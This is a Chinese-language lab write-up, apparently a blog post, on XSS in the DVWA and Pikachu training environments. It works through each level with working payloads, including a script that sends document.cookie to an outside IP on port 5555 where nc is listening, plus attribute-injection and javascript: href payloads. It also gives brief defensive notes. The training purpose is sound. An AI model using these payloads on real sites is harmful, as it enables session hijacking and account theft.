<h2 id="实操：XSS获取cookie"><a href="#实操：XSS获取cookie" class="headerlink" title="实操：XSS获取cookie"></a>实操：XSS获取cookie</h2>
<h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3>
<p>火狐为受害者，已经登陆到DVWA</p>
<p>chrome为攻击者，没有登陆权限/可以登录，但权限不如火狐高</p>
<p>在火狐输入xss语句获取cookie，使用chrome登录其账号</p>
<h3 id="二、构造xss语句"><a href="#二、构造xss语句" class="headerlink" title="二、构造xss语句"></a>二、构造xss语句</h3>
<p>想要把cookie发送给攻击者，所以首先要想到使用get、post请求（下面是用get举例）</p>
<h4 id="1-构造初步代码"><a href="#1-构造初步代码" class="headerlink" title="1-构造初步代码"></a>1.构造初步代码</h4>
<p>攻击者ip为192.168.136.149:8023，而想要发送的内容是cookie，所以先构造出一个简单的url：185.243.241.45:80/?cookie</p>
<h4 id="2-发送get请求"><a href="#2-发送get请求" class="headerlink" title="2-发送get请求"></a>2.发送get请求</h4>
<p>发送get请求可使用的方法有：location重定向（访问当前页面的时候重定向到185.243.241.45:8023/?cookie这个页面）、img标签、script标签等</p>
<p>这里我们使用img标签</p>
<p>img标签传输原理：img标签传输分为两步，首先img src=”url“ 先向url发送一个get请求，之后把请求的内容当作图片展示在页面上</p>
<p>实际上我们只需要其第一步——向src后的url发送一个get请求</p>
<p>发送的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;http://185.243.241.45:5555/?cookie&quot;&gt;<br></code></pre></td></tr></table></figure>
<p>发送后无法识别图片（正常现象）</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613190302252.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613190302252.png" alt="image-20230613190302252"></p>
<p>接收端我们使用nc去监听，其中接收端与发送端（xss语句）的端口要一致【让要攻击代码把cookie发送到5555端口，接收也在5555】</p>
<p>监听成功，但只收到了cookie的字符不是真正的cookie</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191636666.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191636666.png" alt="image-20230613191636666"></p>
<p>说明发送端中的cookie只是数据不是指令</p>
<h4 id="3-构造xss语句"><a href="#3-构造xss语句" class="headerlink" title="3-构造xss语句"></a>3.构造xss语句</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;http://185.243.241.45:5555/?cookie&quot;&gt;<br></code></pre></td></tr></table></figure>
<p>上述代码中的引号包括的部分为完整数据，所以不能直接使用document.cookie，需要进行区分</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191756421.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191756421.png" alt="image-20230613191756421"></p>
<p>使用单引号将数据包含起来，再将三个字符串用加号拼接（’a‘ + ‘b’ = ‘ab’ ，JavaScript中字符串相加），变成【数据+指令执行的结果+数据】的形式</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191806665.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191806665.png" alt="image-20230613191806665"></p>
<p>因为document.cookie是个JavaScript指令，在html页面中必须要用<script>标签包裹起来才可以运行（和alert一样，必须要<script>alert(a);</script>才可以使用）</p>
<p class='item-img' data-src='image-20230613191819543.png'><img src="image-20230613191819543.png" alt="image-20230613191819543"></p>
<p>接下来需要将内容写入html页面中，使用document.write</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;<br>document.write(&#x27;&lt;img src=&quot;http://185.243.241.45:5555/?&#x27;+document.cookie+&#x27;&quot;&gt;&#x27;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>使用加号是为了执行document.cookie以获取cookie信息,且document.cookie如果不使用加号,会被当做字符串失去效果</p>
<p>总结：最外层的<script>标签是告诉浏览器，内部的东西要当作JavaScript脚本运行</p>
<p>document.wirte是将括号里的内容写到html页面当中去</p>
<p>在dvwa输入构造好的payload，再用nc监听</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613192445171.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613192445171.png" alt="image-20230613192445171"></p>
<p>这里一直获取不到大致是因为开启了httponly</p>
<p>这里看个思路吧…</p>
<h2 id="实操：pikachu-XSS通关"><a href="#实操：pikachu-XSS通关" class="headerlink" title="实操：pikachu-XSS通关"></a>实操：pikachu-XSS通关</h2>
<h3 id="0x01-XSS-反射型GET"><a href="#0x01-XSS-反射型GET" class="headerlink" title="0x01-XSS-反射型GET"></a>0x01-XSS(反射型GET)</h3>
<p>拿到一个xss漏洞，首先就是插入一个script代码试试<br>
所以这里我们插入一个<code>&lt;script&gt;alert(123)&lt;/script&gt;</code><br>
代码查看结果，发现对我们的输入长度有限制</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202224727.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202224727.png" alt="image-20230613202224727"></p>
<p>一般长度限制都是通过前端html代码校验，所以这里我们有两种方法<br>
<strong>1.网页框之间输入</strong><br>
因为输入的Payload会在网址框显示，而网址框是没有长度限制的<br>
所以可以之间在网址框插入Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(123)&lt;%2fscript&gt;<br>%2f为URL编码中的 /<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202410868.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202410868.png" alt="image-20230613202410868"></p>
<p>但其实这里编码与否都能成功弹窗</p>
<p>注：使用之前需要查看浏览器是否自动转换URL编码，若无法自动转换则需要手动输入转换。<br>
<strong>2.直接修改html代码</strong><br>
我们在输入框 鼠标右键–检查 弹出开发者工具</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202718363.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202718363.png" alt="image-20230613202718363"></p>
<p>这里将原本的20改为了100,当然可以更大</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202644986.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202644986.png" alt="image-20230613202644986"></p>
<h3 id="0x02-xss-反射型POST"><a href="#0x02-xss-反射型POST" class="headerlink" title="0x02-xss-反射型POST"></a>0x02-xss(反射型POST)</h3>
<p>一进去是个登录界面，刚开始还认为漏洞是在这两个框的其中一个，于是用用户名caker，密码123456试了一下，心想输入回显到页面上的应该是注入点，结果发现两个都没回显</p>
<p>点开提示一看要先用admin账号密码登录.</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204850445.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204850445.png" alt="image-20230613204850445"></p>
<p>于是通过提示所给的账号登录后，得到一个提交页面，感觉和上一关差不多。。而且这关的输入框还没有长度限制</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204907648.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204907648.png" alt="image-20230613204907648"></p>
<p>输入Payload：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
成功获取admin的cookie</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204926199.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204926199.png" alt="image-20230613204926199"></p>
<h3 id="0x03-XSS-存储型"><a href="#0x03-XSS-存储型" class="headerlink" title="0x03-XSS-存储型"></a>0x03-XSS(存储型)</h3>
<p>第三关点开后是一个留言板界面</p>
<p>这里我直接尝试输入paylaod结果直接回显,那我们尝试拿cookie</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205046884.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205046884.png" alt="image-20230613205046884"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205155520.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205155520.png" alt="image-20230613205155520"></p>
<p>点 确定 之后就变成下图这样了，虽然留言内容显示不出来，但是对比一开始进来的时候可以看到多了个“删除”，说明确实多了一条留言</p>
<p>右键–查看网页源代码 的话，可以看到payload在html代码中是原封不动的。。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205331480.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205331480.png" alt="image-20230613205331480"></p>
<p>下面就是见识存储型XSS威力的时候了：</p>
<p>在另外一个浏览器中来到本关页面，也出现了同样的弹框。说明存储型XSS能危害所有访问受影响页面的用户。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205256232.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205256232.png" alt="image-20230613205256232"></p>
<p>这里发现没有回显phpsessid,非常疑惑,毕竟之前那个实操也没有,于是我打开hackbar找到存储发现cookie中的httponly被设置了true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HttpOnly属性是用来限制非HTTP协议程序接口对客户端Cookie进行访问，将取Cookie的操作放到服务端，这样能有效的防止XSS攻击。<br></code></pre></td></tr></table></figure>
<p>导致防御了xss攻击,于是我尝试修改为false发现成功回显</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205537937.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205537937.png" alt="image-20230613205537937"></p>
<h3 id="0x04-XSS-DOM型"><a href="#0x04-XSS-DOM型" class="headerlink" title="0x04-XSS-DOM型"></a>0x04-XSS(DOM型)</h3>
<p>进入第四关发现又是只有一个输入框，所以我们直接输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210228315.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210228315.png" alt="image-20230613210228315"></p>
<p>输入后发现回显了一个链接名曰“what do you see?”</p>
<p>鼠标右键–查看网页源代码，Ctrl+F弹出搜索框，输入what do you see看看</p>
<p>找到了一段js代码，寻找DOM XSS的本质是做js语言阅读理解题</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210411147.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210411147.png" alt="image-20230613210411147"></p>
<p>分析可以得出</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210806648.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210806648.png" alt="image-20230613210806648"></p>
<p>利用了DOM将字符串进行了拼接并把值给a标签的href，然后输出一个what do you see?</p>
<p>所以我们可以利用已知条件构建payload效果为弹窗，弹窗内容为111</p>
<pre><code>&lt;a href='#' onclick=&quot;alert(111)&quot;&gt;'&gt;what do you see?&lt;/a&gt;
</code></pre>
<p>则payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#&#x27; onclick=&quot;alert(111)&quot;&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210917413.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210917413.png" alt="image-20230613210917413"></p>
<h3 id="0x05-XSS-x-DOM型"><a href="#0x05-XSS-x-DOM型" class="headerlink" title="0x05-XSS-x-DOM型"></a>0x05-XSS-x(DOM型)</h3>
<p>进入第五关发现也是一个输入框，在输入框中输了个“哈哈”，提交之后发现吃瓜群众跑到url里面去了（这就是和上一关的不同），然后多出来个链接“有些费尽心机想要忘记的事情,后来真的就忘掉了”</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211243996.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211243996.png" alt="image-20230613211243996"></p>
<p>继续右键查看源代码</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211744113.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211744113.png" alt="image-20230613211744113"></p>
<p>分析代码可以得出这题跟第4题没啥差别，也是利用了DOM将字符串进行了拼接并把值给a标签的href，就是比第4题更容易利用而已</p>
<p>所以输入第四关的Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#&#x27; onclick=&quot;alert(111)&quot;&gt;<br></code></pre></td></tr></table></figure>
<p>输出之后点击链接即可</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613212733311.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613212733311.png" alt="image-20230613212733311"></p>
<p>题外话：</p>
<p>由于本关payload在url中，因此比第4关好利用很多<br>
DOM型XSS只在前端，与后端毫无关系。DOM-X型危害更大，它能够像反射型一样在URL中体现，将URL发给了受害者就能进行攻击。</p>
<h3 id="0x06-XSS-Blind"><a href="#0x06-XSS-Blind" class="headerlink" title="0x06-XSS-Blind"></a>0x06-XSS(Blind)</h3>
<p>进入第六关后发现是一个留言板，随便输入点东西，提交之后发现输入的东西完全不显示在页面上，去哪儿了呢？</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213010680.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213010680.png" alt="image-20230613213010680"></p>
<p>查看网页源代码之后，发现本关的输入是以POST方法提交的，但是form标签里没有action属性，也不知道表单数据被提交到哪里去了呀。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213027969.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213027969.png" alt="image-20230613213027969"></p>
<p>查看提示让我们登录后台地址看看(原来这关需要登录才能进行xss利用)</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213107175.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213107175.png" alt="image-20230613213107175"></p>
<p>跳转到所给页面后，通过提示给的账号密码进行登录(admin,123456)</p>
<p>登录后发现我们之前输入的内容已经记录在后台</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213239474.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213239474.png" alt="image-20230613213239474"></p>
<p>而且内容和用户名都有显示，所以对两个输入框都进行测试<br>
输入Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213331253.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213331253.png" alt="image-20230613213331253"></p>
<p>登录后台，发现输入的Payload触发了两次，所以说明两个输入框都存在xss注入</p>
<h4 id="什么是xss盲打？-XSS-Blind"><a href="#什么是xss盲打？-XSS-Blind" class="headerlink" title="什么是xss盲打？-XSS-Blind"></a>什么是xss盲打？(XSS-Blind)</h4>
<p>简单来说，盲打就是在一切可能的地方尽可能多的提交xss语句，然后看哪一条会被执行，就能获取管理员的cooike。趁着没过期赶紧用了，这样就能直接管理员进后台。然后再上传一句话，大马最终渗透进内网。</p>
<p>​    盲打只是一种惯称的说法，就是不知道后台不知道有没有xss存在的情况下，不顾一切的输入xss代码在留言啊，feedback啊之类的地方，尽可能多的尝试xss的语句与语句的存在方式，就叫盲打。</p>
<p>​    “xss盲打”是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的“真实攻击功能”。</p>
<p>​    通俗讲就是见到输入框就输入提前准备的xss代码， 通常是使用script标签引入远程的js代码，当有后台人员审核提交数据时候，点击了提交的数据，触发获取到有价值信息 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">也就是说我们输入的字符并不会在前端输出   <br><br>只有他的管理员才能看到我们输入的内容      前端用户是看不到的             <br><br>如果说管理员登陆后台之后  后台界面会把我们输入的内容进行输出的话  就意味着后台的管理人员会被x到<br><br>如果真的会被x到  那么这种场景的xss就叫xss的盲打<br></code></pre></td></tr></table></figure>
<h3 id="0x07-XSS-过滤"><a href="#0x07-XSS-过滤" class="headerlink" title="0x07-XSS-过滤"></a>0x07-XSS-过滤</h3>
<p>随便输入一些内容，提交之后发现页面有回显输入的内容，url中也有输入的内容，离开本页面再回来，页面就没有这个内容了，说明是反射型GET型XSS</p>
<p>先用<code>&lt;script&gt;alert(123)&lt;/script&gt;</code>尝试,发现被过滤了</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213738585.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213738585.png" alt="image-20230613213738585"></p>
<p>那我们测试一下哪些没被过滤吧</p>
<p>猜测一下可能有：&quot;,&lt;,&gt;,',on/`() script img href src</p>
<p>可以把这些一个个输入提交试试，也可以一起提交，然后就发现了好玩的情况，如果单独输入&quot;&lt;&gt;‘on/’()则什么都没有被过滤，如果输入了&quot;&lt;&gt;‘on/’() script img href src，则&lt;&gt;‘on/’() script被删掉了，这说明什么问题？这说明过滤语句可能是&lt;script</p>
<p>那我们尝试换标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;a herf=&quot;#&quot; onclick=&quot;alert(document.cookie)&quot;&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214421855.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214421855.png" alt="image-20230613214421855"></p>
<p>当然还有很多标签,可以自行尝试</p>
<h3 id="0x08-XSS-htmlspecialchars"><a href="#0x08-XSS-htmlspecialchars" class="headerlink" title="0x08-XSS-htmlspecialchars"></a>0x08-XSS-htmlspecialchars</h3>
<p>先输入个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，理所当然没有弹框，出现了一个链接（箭头部分），根据之前的经验，这里应该是有个<code>&lt;a&gt;</code>标签</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214542721.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214542721.png" alt="image-20230613214542721"></p>
<p>查看源代码发现如下<img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214601015.png" alt="image-20230613214601015"></p>
<p>很明显这里&lt;和&gt;都被编码了</p>
<p>发现不管是<code>&lt;a&gt;</code>标签内还是href属性内，左右尖括号被编码了，因此这关想闭合标签是不行了。仔细一看，又发现单引号居然没有被html编码，可以可以，利用一下<code>&lt;a&gt;</code>标签吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输入Payload:<br>#&#x27; onclick=&#x27;alert(document.cookie)&#x27;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214827824.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214827824.png" alt="image-20230613214827824"></p>
<h3 id="0x09-XSS-href输出"><a href="#0x09-XSS-href输出" class="headerlink" title="0x09-XSS-href输出"></a>0x09-XSS-href输出</h3>
<p>还是先输入个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，没有弹框</p>
<p>鼠标右键–查看网页源代码，发现左右尖括号和单引号都被html编码了，这样的话，闭合标签或者闭合属性都行不通了。</p>
<p>但也不是没办法了，W3School中对<a>标签的href属性有以下描述（引用摘自HTML <a>标签的 href 属性）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;a&gt;标签的 href 属性用于指定超链接目标的 URL。<br><br>href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了&lt;a&gt;标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。<br></code></pre></td></tr></table></figure>
<p>从上述描述可见，这边可以利用JavaScript协议。输入<br>
payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javascript:alert(document.cookie)<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215618484.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215618484.png" alt="image-20230613215618484"></p>
<p>思考：</p>
<p>那么当用户输入由href属性输出时，该怎么防御xss呢？</p>
<p>仅仅html编码就不够了，本关的php源代码中给了提示（有点简略，这里稍微扩充一点）。遇到这种情况，需要两点处理：</p>
<p>1、检查用户输入，必须以http或者https开头。注意，不可以仅仅是包含http和https。</p>
<p>2、进行html实体编码<br class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215657023.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215657023.png" alt="image-20230613215657023"></p>
<h3 id="0x10-XSS-js输出"><a href="#0x10-XSS-js输出" class="headerlink" title="0x10-XSS-js输出"></a>0x10-XSS-js输出</h3>
<p>还是输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，果不其然没有弹框</p>
<p>鼠标右键–查看网页源代码，刚刚输入的东西跑到<code>&lt;script&gt;</code>标签内了，并且没有被编码</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220200088.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220200088.png" alt="image-20230613220200088"></p>
<p>接下来就很简单了，只要无中生有出一个js语句就好了，首先要用’;闭合掉当前的语句，然后插入新语句，然后再用//注释掉老语句遗留下来的’;</p>
<p>输入payload：<code>';alert(1);//</code></p>
<p>成功弹窗</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220441105.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220441105.png" alt="image-20230613220441105"></p>
<p>也可以</p>
<p>直接可以输入<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，得到弹窗：</p>
<p>查看php，这里的关键是JS的输出点应该使用\对特殊字符进行转义：</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220758486.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220758486.png" alt="image-20230613220758486"></p>
<p>总结：<br>
1、在不知道它过滤了什么的情况下，可以用**&quot;&lt;&gt;'on/`() script img href src**等字符<br>
2、用htmlspecialchars进行过滤，默认情况下没有过滤单引号。<br>
3、在a标签的href中可以利用JavaScript协议执行js语句。在有输入接口，并且将输入内容直接赋值给变量的，可以构造闭合来执行恶意js代码。</p>
<h3 id="0x11-XSS-get-cookie"><a href="#0x11-XSS-get-cookie" class="headerlink" title="0x11-XSS-get-cookie"></a>0x11-XSS-get_cookie</h3>
<p>简述一下XSS获取cookie的过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">用户  用浏览器  访问存在xss漏洞的站点<br><br>站点  返回给浏览器的  数据带有  恶意js代码<br><br>用户  浏览器执行  js代码  要求  发送cookie给  攻击者<br><br>攻击者伪造用户登录站点，造成破环<br></code></pre></td></tr></table></figure>
<p>相比于GET方式，黑客通过POST方式窃取Cookie更加神不知鬼不觉，这里来复现一下</p>
<p>首先需要搭建一个收集Cookie的后台。这里Pikachu已经为我们准备好了，只需要在左侧管理工具栏进入XSS后台，点击初始化</p>
<p>修改IP地址。打开Pikachu/pkxss/xcookie/post.html文件，因为这里是在本地演示，因此2个IP都修改为127.0.0.1，通过目录来区分漏洞网站和黑客后台。如果是在多台虚拟机中进行实验，即将第1处修改为漏洞网站IP，第2个处修改为黑客后台IP即可</p>
<p>这里我用服务器演示吧(pikachu自带后台出问题了)</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614104228257.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614104228257.png" alt="image-20230614104228257"></p>
<p>注:图片的第二个ip后面应加一个5555端口,我忘记了,此时，打开一个浏览器来模拟用户。先访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/pikachu/vul/xss/xsspost/post_login.php<br></code></pre></td></tr></table></figure>
<p>并使用另一个账号test/abc123登陆</p>
<p>在用户浏览器中访问黑客伪造的post.html站点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/pikachu/pkxss/xcookie/post.html<br></code></pre></td></tr></table></figure>
<p>这里呢我就直接借用登录后的输入框来当做点击恶意站点了</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105256890.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105256890.png" alt="image-20230614105256890"></p>
<p>此时，黑客可以在XSS后台看到窃取到的Cookie。黑客浏览器访问后台：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/pikachu/pkxss/xcookie/pkxss_cookie_result.php<br></code></pre></td></tr></table></figure>
<p>这里我直接用服务器监听5555端口,用户点击发送后我这里就能看到cookie了</p>
